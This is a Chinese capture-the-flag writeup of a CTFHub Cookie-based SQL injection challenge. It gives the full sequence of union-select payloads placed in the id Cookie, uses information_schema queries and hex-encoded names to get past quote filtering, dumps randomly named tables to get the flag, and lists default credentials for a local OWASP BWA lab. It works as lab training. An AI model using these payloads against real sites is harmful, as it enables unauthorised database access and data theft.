---
layout: post
title: CTFHub Cookie注入Writeup
date: "2026-11-23 17:58:00 +0800"
categories: [CTF, CTFHub, Web]
tags: [ctfhub, mysql, sql-injection]
---

## 一、学习环境

- 靶机：CTFHub技能树Cookie注入
- 地址：http://challenge-69d442ad03137ebe.sandbox.ctfhub.com:10800
- 本地环境：OWASP BWA，192.168.216.129
- SSH：ssh bwa
- MySQL：mysql -u root -powaspbwa
- 常用库：dvwa、owasp10、bricks、peruggia、mutillidae
- 铁律：全程不用use，跨库一律写 库名.表名，或在information_schema里用where table_schema过滤

## 二、题目信息

- 平台：CTFHub
- 题型：Web，SQL注入
- 考点：Cookie注入、union跨库取数、十六进制代替引号

## 三、解题思路

页面打开后只有一个提示，没有输入框可以操作。用curl看响应头，发现服务端下发了两个Cookie，其中id的值是1。

这说明参数不在URL里，而在Cookie里。注入点随之从查询字符串换到了请求头。

思路不变：先确认这个id被拼进了SQL，再数两列，然后用union把库名、表名、字段名、数据依次带出来。

## 四、解题步骤

1、确认注入点在Cookie。请求页面并打印响应头：

```
curl -i http://靶机地址/
```

返回Set-Cookie: id=1，说明服务端用这个Cookie决定查询哪条记录。

2、确认可控。带上Cookie请求：

```
curl -H请求头 目标地址
```

请求头内容为id=1，页面显示ID为1、Data为ctfhub。

再把Cookie改成id=1 and 1=2，结果区空白，说明id的值被拼进SQL并参与运算，注入点确认。

3、数列数。Cookie改成：

```
id=1 order by 2
```

正常显示；改成id=1 order by 3，空白，说明只有两列。

4、确认回显位。Cookie改成：

```
id=999 union select 1,2
```

页面显示ID为1、Data为2，两列都会输出。用999是因为1有数据，伪造行会被挤到第二行看不见。

5、读库名。Cookie改成：

```
id=999 union select 1,database()
```

Data位置返回sqli。

6、读表名。Cookie改成：

```
id=999 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x73716c69
```

0x73716c69是sqli的十六进制。返回ivzghcepte、news，随机名那张是目标。

7、读字段名。Cookie改成：

```
id=999 union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x73716c69 and table_name=0x69767a67686365707465
```

0x69767a67686365707465是表名ivzghcepte的十六进制。返回字段名fsvcjajytd。

8、取数据。Cookie改成：

```
id=999 union select 1,group_concat(fsvcjajytd) from sqli.ivzghcepte
```

Data位置返回ctfhub{0949ba8d6b915f006abf9f37}，即flag。

## 五、踩坑记录

**坑一：在地址栏找不到参数**

现象：页面没有输入框，URL后面也没有id参数，不知道从哪注入。

原因：参数在Cookie里，地址栏改不了Cookie。

解决：用curl加请求头，或者用Burp抓包改Cookie，或者浏览器开发者工具的Application面板改。

**坑二：只改URL没用**

现象：在URL后面加 ?id=1 and 1=2，页面毫无变化。

原因：程序读的是Cookie，不读查询字符串。

解决：把payload放进Cookie，服务端读哪个位置，就往哪个位置放。

**坑三：表名字段名随机**

现象：按习惯查flag表，查不到。

原因：本题表名ivzghcepte、字段名fsvcjajytd都是随机串。

解决：先查information_schema，再查数据，不能猜。

## 六、问题与解答

**问：Cookie注入和URL注入有什么区别。**

答：注入位置不同。URL注入参数在查询字符串，Cookie注入参数在请求头。SQL拼接方式和利用手法完全一样，只是把payload换个地方放。

**问：怎么改Cookie。**

答：三种方式。curl加-H参数；Burp抓包后改请求头再放行；浏览器开发者工具的Application面板手动改。前两种适合批量，最后一种适合演示。

**问：为什么还要查information_schema。**

答：表名和字段名都是随机串，不查目录就不知道从哪取数。跨库查询靠 库名.表名，或者where table_schema过滤，不用use。

**问：为什么库名要写十六进制。**

答：十六进制不需要引号，绕开引号过滤，也避免手误写成中文引号。sqli的ASCII是73 71 6C 69，前面加0x即可。

## 七、总结

1、注入点不一定在URL。请求头、Cookie、Referer、User-Agent都可能被拼进SQL。
2、找注入点先看响应：Set-Cookie出现业务参数，就说明服务端在用Cookie决策。
3、手法不变：数两列、找回显位、union查库表字段、取数据。
4、表名字段名随机时，information_schema是唯一入口。
